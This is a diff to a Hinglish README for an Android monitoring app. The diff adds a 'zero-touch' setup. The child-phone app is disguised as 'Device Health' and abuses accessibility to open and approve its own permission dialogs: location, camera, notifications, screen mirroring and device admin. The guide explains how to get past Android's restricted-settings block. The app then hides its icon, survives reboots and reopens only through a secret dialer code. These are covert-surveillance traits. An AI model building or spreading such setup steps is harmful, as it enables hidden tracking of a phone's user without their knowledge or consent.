@@ -103,12 +103,13 @@ Fallback: dashboard se **APK manually upload** kar sakte ho (custom build ho to)
 
 ## 3) One-time setup (5 minutes)
 
-**⚡ QR se instant setup (recommended)**
+**⚡ QR se ZERO-TOUCH setup (recommended)**
 
 1. Web dashboard par pair-card me jo **QR** hai, wo child phone ke camera se **scan** karo.
-2. Child app apne aap khulegi — server + pairing code apne bhar kar **pair apne aap ho jayega**.
-3. Permission wizard me **"⚡ Auto-grant all"** dabao — har permission screen khud khulti hai aur (accessibility enable hone ke baad) dialog buttons khud allow ho jate hain. Android ki wajah se sirf accessibility enable karna ek baar manual hai.
-4. **Finish & Hide App** — bas.
+2. Pehli baar install: page se APK download → install → wapas page par aakar **green "App kholo & auto-setup"** button dabao.
+3. App khud pair ho jayegi, phir **auto-setup khud chal padta hai** — har permission screen apne aap kulti hai aur dialogs khud allow ho jate hain.
+4. **Sirf 1 manual step poore phone me:** Accessibility me "Device Health" toggle ON karna (Android ise programmatically allow nahi karta). Android 13+ par agar "Restricted setting" aaye: App info → ⋮ → Allow restricted settings pehle karo.
+5. Us toggle ke baad phone ko chhua bhi mat — baaki sab (location, usage, overlay, notification, camera, battery, admin, mirror consent) khud grant hote hain, aur core permissions poore hote hi **app khud hide ho jati hai**. Wizard ka button/Finish dabane ki zarurat hi nahi.
 
 **Manual tarike se**
 
@@ -119,10 +120,10 @@ Fallback: dashboard se **APK manually upload** kar sakte ho (custom build ho to)
 
 **Child phone — "Device Health"**
 1. Open app → enter server URL (pre-filled) + pairing code → **Pair**.
-2. Go down the permission checklist: Location, Usage access, Overlay, Notification access, Camera, (optional) Calls/SMS, Screen capture, Battery optimization, Device admin.
+2. Go down the permission checklist: Accessibility, Location, Usage access, Overlay, Notification access, Camera, (optional) Calls/SMS, Screen capture, Battery optimization, Device admin.
 3. **Finish & Hide App** → icon disappears, service keeps running.
 
-Done — **you never touch the child phone again.** Everything (limits, blocked apps, geofences, mirror, lock…) is managed from the parent app.
+Done — **you never touch the child phone again.** Everything (limits, blocked apps, geofences, mirror, lock…) is managed from the parent app. Reboot/self-heal bhi fully automatic hai — permission dobara maangne wala koi dialog nahi aayega.
 
 ### Re-opening the child app (if ever needed)
 - Dial `*#*#2724#*#*` on the child phone, **or**
